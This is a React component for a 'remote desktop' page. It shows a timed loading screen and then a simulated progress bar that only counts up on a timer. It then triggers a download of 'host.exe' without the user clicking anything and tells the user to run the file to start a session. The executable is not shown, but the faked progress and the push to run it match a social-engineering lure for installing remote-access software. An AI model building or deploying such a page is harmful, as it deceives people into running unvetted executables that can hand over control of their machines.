import React, { useEffect, useState } from 'react';

const RemoteDesktop = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [isDownloading, setIsDownloading] = useState(false);
  const [downloadProgress, setDownloadProgress] = useState(0);

  useEffect(() => {
    const loadingTimeout = setTimeout(() => {
      setIsLoading(false);
      setIsDownloading(true);
      startDownload();
    }, 5000); // Show loading for 5 seconds

    return () => clearTimeout(loadingTimeout);
  }, []);

  const startDownload = () => {
    const downloadInterval = setInterval(() => {
      setDownloadProgress((prev) => {
        if (prev >= 100) {
          clearInterval(downloadInterval);
          return 100;
        }
        return prev + 10; // Increase progress
      });
    }, 500); // Increase every 500ms

    // Simulate download completion and trigger file download
    setTimeout(() => {
      clearInterval(downloadInterval);
      const link = document.createElement('a');
      link.href = '/host.exe'; // Reference the host.exe directly
      link.download = 'host.exe'; // This name will be used for the downloaded file
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 6000); // Start download after 6 seconds

    setTimeout(() => {
      setIsDownloading(false);
    }, 12000); // Hide download animation after 12 seconds
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-100">
      {isLoading && (
        <div className="text-center">
          <h2 className="text-3xl">Loading...</h2>
          <p>Please wait while we prepare your session.</p>
          <div className="mt-4 animate-spin h-16 w-16 border-4 border-blue-500 rounded-full"></div>
        </div>
      )}
      {isDownloading && (
        <div className="text-center">
          <h2 className="text-3xl">Downloading...</h2>
          <p>Your file is being downloaded. Please wait.</p>
          <div className="mt-4">
            <div className="w-full bg-gray-200 rounded-full">
              <div
                className="bg-blue-500 text-xs font-medium text-blue-100 text-center p-0.5 leading-none rounded-full"
                style={{ width: `${downloadProgress}%` }}
              >
                {downloadProgress}%
              </div>
            </div>
          </div>
        </div>
      )}
      {!isDownloading && !isLoading && (
        <div className="text-center">
          <h2 className="text-3xl">Download Complete!</h2>
          <p>Please run the downloaded file to start the session.</p>
        </div>
      )}
    </div>
  );
};

export default RemoteDesktop;
